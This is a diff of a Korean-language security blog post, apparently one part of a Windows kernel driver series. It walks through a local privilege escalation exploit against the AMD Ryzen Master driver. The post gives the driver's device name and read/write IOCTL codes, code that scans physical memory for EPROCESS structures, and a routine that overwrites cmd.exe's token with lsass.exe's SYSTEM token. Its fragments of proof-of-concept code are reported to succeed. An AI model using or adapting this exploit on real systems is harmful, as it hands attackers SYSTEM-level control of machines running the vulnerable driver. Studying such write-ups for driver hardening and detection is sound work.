 <p>&#xC624;&#xD504;&#xC14B;&#xACFC; <code>EPROCESS</code> &#xD558;&#xC704; 4 bytes &#xAC12; <code>0x00000003</code>&#xC740; &#xC708;&#xB3C4;&#xC6B0; &#xBE4C;&#xB4DC; &#xBC84;&#xC804;&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xB97C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 </blockquote>
-<p><br></p>
+<br>
+
 <p>&#xC6B0;&#xC120; &#xC804;&#xCCB4; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC11C;&#xCE6D;&#xD558;&#xBA70; <code>Proc</code> &#xD0DC;&#xADF8;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xBAA8;&#xB450; &#xAE30;&#xB85D;&#xD558;&#xAE30; &#xC704;&#xD574; <code>PROC_DATA</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xC120;&#xC5B8;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>
     INT64 proc_address[<span class="hljs-number">300</span>];
@@ -1031,7 +1081,9 @@ PROCESS ffffbd010035b080
     INT64 header_size[<span class="hljs-number">300</span>];
     INT64 proc_count;
 } PROC_DATA;</code></pre>
-<p><br></p>
+
+<br>
+
 <p>&#xC774;&#xC81C; &#xC11C;&#xCE6D;&#xD560; &#xBB3C;&#xB9AC; &#xBA54;&#xBAA8;&#xB9AC; &#xBC94;&#xC704;&#xB97C; &#xC9C0;&#xC815;&#xD574;&#xC57C; &#xD558;&#xB294;&#xB370;, &#xC774; &#xBC94;&#xC704;&#xB294; &#xD638;&#xC2A4;&#xD2B8;&#xC758; &#xC804;&#xCCB4; &#xBA54;&#xBAA8;&#xB9AC;&#xB098; (&#xAC00;&#xC0C1;&#xBA38;&#xC2E0;&#xC5D0;&#xC11C; &#xD14C;&#xC2A4;&#xD2B8;&#xD558;&#xB294; &#xACBD;&#xC6B0;) &#xAC00;&#xC0C1;&#xBA38;&#xC2E0;&#xC5D0; &#xD560;&#xB2F9;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xD06C;&#xAE30; &#xB4F1;&#xC5D0; &#xB530;&#xB77C; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xC544; &#xC11C;&#xCE6D;&#xD560; &#xBA54;&#xBAA8;&#xB9AC; &#xBC94;&#xC704;&#xAC00; &#xD06C;&#xAC8C; &#xCC28;&#xC774;&#xAC00; &#xB098;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD14C;&#xC2A4;&#xD2B8;&#xD558;&#xB294; &#xD658;&#xACBD;&#xC5D0; &#xB9DE;&#xAC8C; &#xC124;&#xC815;&#xD574;&#xC8FC;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC81C; &#xACBD;&#xC6B0;&#xB294; &#xD638;&#xC2A4;&#xD2B8; PC 16GB, VM&#xC5D0; 4GB&#xB97C; &#xD560;&#xB2F9;&#xD588;&#xC73C;&#xBA70; <code>0x120000000</code> ~ <code>0x240000000</code> &#xBC94;&#xC704;&#xB85C; &#xC9C0;&#xC815;&#xC744; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DEVICE_NAME         <span class="hljs-meta-string">&quot;\\\\\\\\.\\\\AMDRyzenMasterDriverV15&quot;</span></span>
 <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WRITE_IOCTL         (DWORD)0x81112F0C</span>
@@ -1088,22 +1140,28 @@ PROCESS ffffbd010035b080
 }
 
 ...</code></pre>
+
 <p>&#xC704; &#xCF54;&#xB4DC;&#xB294; <code>0x120000000</code> ~ <code>0x240000000</code> &#xC0AC;&#xC774; Proc &#xD0DC;&#xADF8;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xBAA8;&#xB450; &#xCC3E;&#xB294; &#xB8E8;&#xD2F4;&#xC785;&#xB2C8;&#xB2E4;.</p>
-<p><br></p>
+<br>
+
 <pre><code class="hljs c">INT64 read_address = START_ADDRESS + (i * <span class="hljs-number">0x1000</span>);
 <span class="hljs-keyword">if</span> (read_address &gt;= END_OF_ADDRESS) {
 	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;END of Address\\n&quot;</span>);
 	<span class="hljs-keyword">return</span> proc_data;
 }</code></pre>
+
 <p>&#xC77D;&#xC744; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB97C; <code>0x120000000</code>&#xBD80;&#xD130; &#xC2DC;&#xC791;&#xD574; Page &#xD06C;&#xAE30;&#xC778; <code>0x1000</code> &#xB2E8;&#xC704;&#xB85C; &#xC99D;&#xAC00;&#xC2DC;&#xD0A4;&#xBA70; &#xC11C;&#xCE6D;&#xC744; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p>
-<p><br></p>
+<br>
+
 <pre><code class="hljs c">READ_INPUT_BUFFER input_buff = { read_address, len };
 LPVOID output_buff = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x100c</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        
 DeviceIoControl(dHandle, READ_IOCTL, &amp;input_buff, <span class="hljs-number">0x40</span>, output_buff, <span class="hljs-number">0x100c</span>, &amp;dwRet, <span class="hljs-number">0</span>);
 INT64 result = (INT64)output_buff + <span class="hljs-number">0xc</span>;</code></pre>
+
 <p><code>input_buff</code>&#xC5D0;&#xB294; &#xBB3C;&#xB9AC; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xC640; &#xAE38;&#xC774;(<code>0x1000</code>)&#xB97C; &#xC8FC;&#xACE0;, <code>output_buff</code>&#xC5D0; &#xCDA9;&#xBD84;&#xD55C; &#xACF5;&#xAC04;&#xC744; &#xD560;&#xB2F9;&#xD574; <code>DeviceIoControl</code> &#xD568;&#xC218;&#xB85C; <code>0x81112F08</code> IOCTL &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;.  <code>0x81112F08</code> &#xC740; METHOD_BUFFERED &#xB85C; input&#xACFC; output &#xBC84;&#xD37C;&#xB97C; &#xACF5;&#xC720;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; IOCTL &#xACB0;&#xACFC; &#xBC84;&#xD37C;&#xC5D0; Input&#xAC12;&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>output_buff</code>&#xC5D0; <code>0xc</code> (<code>INT64 read_address(0x8) + DWORD len(0x4)</code>) &#xB9CC;&#xD07C; &#xB354;&#xD55C; &#xC704;&#xCE58;&#xC758; &#xAC12;&#xC774; IOCTL &#xC694;&#xCCAD;&#xC758; &#xACB0;&#xACFC;&#xAC12;&#xC778; &#xB9E4;&#xD551;&#xB41C; &#xAC00;&#xC0C1; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xAC00; &#xB418;&#xACE0; <code>result</code>&#xB85C; &#xB4E4;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;.</p>
-<p><br></p>
+<br>
+
 <pre><code class="hljs c"><span class="hljs-keyword">for</span> (INT64 j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">0xF60</span>; j += <span class="hljs-number">0x10</span>) { <span class="hljs-comment">// Searching Proc Tag</span>
 	PINT64 proc_ptr = (PINT64)(result + <span class="hljs-number">0x4</span> + j);
 	INT32 proc_val = *(PINT32)proc_ptr
@@ -1126,8 +1184,10 @@ INT64 result = (INT64)output_buff + <span class="hljs-number">0xc</span>;</code>
 		}            
 	}
 }</code></pre>
+
 <p>&#xC6B0;&#xC120; <code>result</code>&#xC5D0;&#xC11C; <code>0x10</code> aligned &#xB2E8;&#xC704;&#xB85C; &#xB8E8;&#xD504;&#xB97C; &#xB3CC;&#xBA70; <code>+0x4</code> &#xC704;&#xCE58; &#xC8FC;&#xC18C;&#xC758; &#xAC12;&#xC774; <code>0x635f7250</code>(Proc)&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. Proc &#xD0DC;&#xADF8;&#xB97C; &#xCC3E;&#xC558;&#xC73C;&#xBA74; &#xC774;&#xD6C4; <code>PROC_HEADER</code>&#xC758; &#xC608;&#xC0C1; &#xCD5C;&#xB300; &#xD06C;&#xAE30;&#xC778; &#xC57D; <code>0xA0</code>&#xAE4C;&#xC9C0; <code>0x10</code> &#xB2E8;&#xC704;&#xB85C; &#xB8E8;&#xD504;&#xB97C; &#xD55C; &#xBC88; &#xB354; &#xB3CC;&#xBA74;&#xC11C; <code>0x00000003</code> &#xAC12;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xCC3E;&#xACE0;, &#xCC3E;&#xC73C;&#xBA74; &#xD604;&#xC7AC;&#xAE4C;&#xC9C0; &#xAD6C;&#xD55C; Proc tag address &#xC640; page entry offset, header size&#xB97C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xAC12;&#xC73C;&#xB85C; &#xC774;&#xD6C4;&#xC5D0; &#xB2E4;&#xC2DC; <code>EPRCEOSS</code>&#xC758; &#xC704;&#xCE58;&#xB97C; &#xACC4;&#xC0B0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
-<p><br></p>
+<br>
+
 <p>&#xC774;&#xC81C; &#xC800;&#xC7A5;&#xB41C; <code>PROC_DATA</code> &#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xAC01; &#xBC30;&#xC5F4;&#xC5D0;&#xC11C; <code>EPROCESS</code> &#xC758; &#xAC01; &#xD544;&#xB4DC;&#xAC12;(<code>ImageFileName</code>, <code>Token</code>, <code>UniqueProcessId</code>)&#xC744; &#xAD6C;&#xD558;&#xACE0; <code>cmd.exe</code>&#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; <code>Token</code> &#xC8FC;&#xC18C;&#xC640; &#xC2DC;&#xC2A4;&#xD15C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; <code>Token</code> &#xAC12;&#xC744; &#xAD6C;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">parse_proc</span><span class="hljs-params">(PROC_DATA proc_data, HANDLE dHandle)</span> </span>{
     DWORD bytes_ret = <span class="hljs-number">0</span>;
@@ -1160,8 +1220,10 @@ INT64 result = (INT64)output_buff + <span class="hljs-number">0xc</span>;</code>
         }
     }
 }</code></pre>
+
 <p><code>proc_address &#xC8FC;&#xC18C;&#xC5D0; &#xB9E4;&#xD551;&#xB41C; &#xAC00;&#xC0C1; &#xC8FC;&#xC18C; + page entry offset + header size</code> &#xAC00; <code>EPROCESS</code>&#xC758; &#xC704;&#xCE58;&#xAC00; &#xB418;&#xBA70; &#xC0AC;&#xC804;&#xC5D0; &#xAD6C;&#xD55C; <code>EPROCESS</code>&#xC758; &#xAC01; &#xD544;&#xB4DC;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC744; &#xB354;&#xD574; <code>Token</code>&#xACFC; <code>ImageFileName</code>&#xC744; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>ImageFileName</code>&#xC774; <code>cmd.exe</code>&#xBA74; &#xD574;&#xB2F9; <code>EPROCESS</code>&#xC758; <code>Token</code> &#xD544;&#xB4DC; &#xC8FC;&#xC18C;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0;, &#xC2DC;&#xC2A4;&#xD15C; &#xD504;&#xB85C;&#xC138;&#xC2A4; <code>lsass.exe</code>&#xBA74; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; <code>Token</code> &#xD544;&#xB4DC;&#xC758; &#xAC12;&#xC744; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p>
-<p><br></p>
+<br>
+
 <h2 id="Overwrite-Token"><a href="#Overwrite-Token" class="headerlink" title="Overwrite Token"></a>Overwrite Token</h2><p>&#xC774;&#xC81C; &#xC774;&#xC804; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C; &#xD14C;&#xC2A4;&#xD2B8;&#xD55C; &#xAC83; &#xCC98;&#xB7FC; <code>lsass.exe</code>&#xC758; <code>Token</code>&#xAC12;&#xC744; <code>cmd.exe</code>&#xC758; <code>Token</code> &#xD544;&#xB4DC;&#xC5D0; overwrite&#xD558;&#xBA74; <code>cmd.exe</code>&#xC758; &#xAD8C;&#xD55C;&#xC744; <code>NT AUTORITY\SYSTEM</code>&#xC73C;&#xB85C; &#xBC14;&#xAFD4; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">overwrite_token</span><span class="hljs-params">(HANDLE dHandle)</span> </span>{
     DWORD modulus = cmd_token_addr % <span class="hljs-number">0x1000</span>;
@@ -1191,13 +1253,16 @@ INT64 result = (INT64)output_buff + <span class="hljs-number">0xc</span>;</code>
     DeviceIoControl(dHandle, WRITE_IOCTL, input_buff2, modulus + <span class="hljs-number">0x8</span> + <span class="hljs-number">0xc</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;bytes_ret, <span class="hljs-literal">NULL</span>);
 
 }</code></pre>
+
 <p>&#xC774;&#xB54C; &#xD55C; &#xAC00;&#xC9C0; &#xBB38;&#xC81C;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294;&#xB370;, Page &#xB2E8;&#xC704;&#xB85C; &#xB9E4;&#xD551;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; memory write&#xC758; &#xACBD;&#xC6B0; &#xC815;&#xD655;&#xD788; Token &#xAC12; 8 bytes&#xB9CC; overwrite&#xD560; &#xC218; &#xC5C6;&#xB2E4;&#xB294; &#xBB38;&#xC81C;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <p>&#xD574;&#xACB0;&#xBC95;&#xC740; &#xAC04;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;! Page pool&#xC758; &#xC2DC;&#xC791;&#xBD80;&#xD130; <code>Token</code> &#xC8FC;&#xC18C; &#xC804;&#xAE4C;&#xC9C0;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xAC12;&#xB4E4;&#xC744; <code>READ_IOCTL</code>&#xB85C; &#xBAA8;&#xB450; &#xAC00;&#xC838;&#xC640; &#xBC84;&#xD37C;&#xC5D0; &#xC800;&#xC7A5;&#xD55C; &#xB4A4;, &#xD574;&#xB2F9; &#xBC84;&#xD37C;&#xC5D0; overwrite&#xD560; &#xD1A0;&#xD070;&#xAC12;&#xB9CC; &#xCD94;&#xAC00;&#xD55C; &#xBC84;&#xD37C;&#xB97C; <code>WRITE_IOCTL 0x81112F0C</code>&#xC744; &#xD1B5;&#xD574; input&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xD558;&#xBA74; Page pool &#xC2DC;&#xC791;&#xC8FC;&#xC18C;&#xBD80;&#xD130; <code>Token</code> &#xC8FC;&#xC18C; &#xC804;&#xAE4C;&#xC9C0;&#xB294; exploit &#xC804;&#xACFC; &#xB3D9;&#xC77C;&#xD55C; &#xAC12;&#xC774; &#xC720;&#xC9C0;&#xB418;&#xACE0; &#xD1A0;&#xD070;&#xAC12;&#xB9CC; &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
-<p><br></p>
+<br>
+
 <p>&#xC774;&#xC81C; cmd&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xBE4C;&#xB4DC;&#xD55C; PoC&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74;..</p>
-<p><img src="/2021/08/11/l0ch/windows-driver-part4/3.gif" srcset="/img/loading.gif" alt></p>
+<p><img src="/2021/08/11/l0ch/windows-driver-part4/3.gif" srcset="/img/loading.gif"></p>
 <p>&#xC775;&#xC2A4; &#xC131;&#xACF5;!</p>
-<p><br></p>
+<br>
+
 <p>&#xC544;&#xB798;&#xB294; &#xC804;&#xCCB4; PoC&#xC785;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span>
 <span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
@@ -1354,6 +1419,7 @@ INT64 system_token_value = <span class="hljs-number">0</span>;
     CloseHandle(dHandle);
     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
 }</code></pre>
+
 <p>&#xAE30;&#xCD08;&#xAC00; &#xBD80;&#xC2E4;&#xD574;&#xC11C; &#xBB3C;&#xB9AC;&#xBA54;&#xBAA8;&#xB9AC; &#x2194; &#xAC00;&#xC0C1; &#xBA54;&#xBAA8;&#xB9AC; &#xC0AC;&#xC774; &#xB9E4;&#xD551; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC81C;&#xB300;&#xB85C; &#xB2E4;&#xC2DC; &#xC774;&#xD574;&#xD558;&#xB290;&#xB77C; &#xACE0;&#xC0DD;&#xC744; &#xC880; &#xD55C; &#xAC70; &#xB9D0;&#xACE0;&#xB294;&#x2026; &#xBB34;&#xB09C;&#xD558;&#xAC8C; &#xBD84;&#xC11D;&#xD588;&#xB358; &#xAC83; &#xAC19;&#xB124;&#xC694;. &#xC5ED;&#xC2DC; &#xACF5;&#xBD80; &#xD55C;&#xBC88; &#xD560; &#xB54C; &#xC81C;&#xB300;&#xB85C; &#xD574;&#xB194;&#xC57C; &#xB098;&#xC911;&#xC5D0; &#xACE0;&#xC0DD;&#xC744; &#xC548;&#xD558;&#xC9C0;&#x3160;&#x3160;</p>
 <p>&#xB2E4;&#xC74C;&#xC5D0;&#xB294; &#xC815;&#xC0C1;&#xC801;&#xC778;(?) &#xC81C;&#xBAA9;&#xC758; &#xC2DC;&#xB9AC;&#xC988;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC548;&#xB155;~</p>
 <blockquote>
@@ -1382,11 +1448,11 @@ INT64 system_token_value = <span class="hljs-number">0</span>;
                 <div class="post-meta">
                   <i class="iconfont icon-tags"></i>
                   
-                  <a class="hover-with-bg" href="/tags/lpe/">lpe</a>
-                  
                   <a class="hover-with-bg" href="/tags/windows/">windows</a>
                   
                   <a class="hover-with-bg" href="/tags/kernel/">kernel</a>
+                  
+                  <a class="hover-with-bg" href="/tags/lpe/">lpe</a>
                   
                   <a class="hover-with-bg" href="/tags/L0ch/">L0ch</a>
                   
